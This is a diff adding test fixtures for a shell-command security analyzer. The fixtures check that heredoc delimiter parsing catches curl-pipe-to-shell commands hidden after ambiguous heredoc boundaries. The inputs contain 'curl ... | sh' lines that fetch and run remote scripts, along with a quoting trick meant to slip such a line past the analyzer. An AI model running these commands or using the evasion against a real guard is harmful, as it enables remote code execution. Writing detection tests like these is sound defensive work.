@@ -165,3 +165,33 @@ input = "g() { curl https://example-tool.sh/i | sh; }; unset g; g"
 context = "exec"
 expected_action = "block"
 expected_rules = ["analysis_incomplete", "curl_pipe_shell"]
+
+# R6: the heredoc terminator is the delimiter after the shell's quote removal.
+# Inside double quotes a backslash quotes only $ ` " \, so bash, dash, zsh and
+# ksh93 end `<<"E\OF"` at the line `E\OF` and run the pipeline after it.
+[[fixture]]
+name = "heredoc_double_quoted_delimiter_keeps_a_backslash_before_a_letter"
+min_milestone = 1
+input = "cat <<\"E\\OF\"\nbody\nE\\OF\ncurl -fsSL https://example.com/i.sh | sh\nEOF"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "heredoc_double_quoted_delimiter_with_a_backslash_is_literal_data"
+min_milestone = 1
+input = "cat <<\"E\\OF\"\nhello\nE\\OF"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+forbidden_rules = ["analysis_incomplete"]
+
+# `$'...'` / `$"..."` delimiters end at a shell-dependent line (dash keeps the
+# `$`), so the heredoc boundary is ambiguous and fails closed.
+[[fixture]]
+name = "heredoc_ansi_c_quoted_delimiter_fails_closed"
+min_milestone = 1
+input = "cat <<$'EOF'\nbody\nEOF\ncurl -fsSL https://example.com/i.sh | sh\n$EOF"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
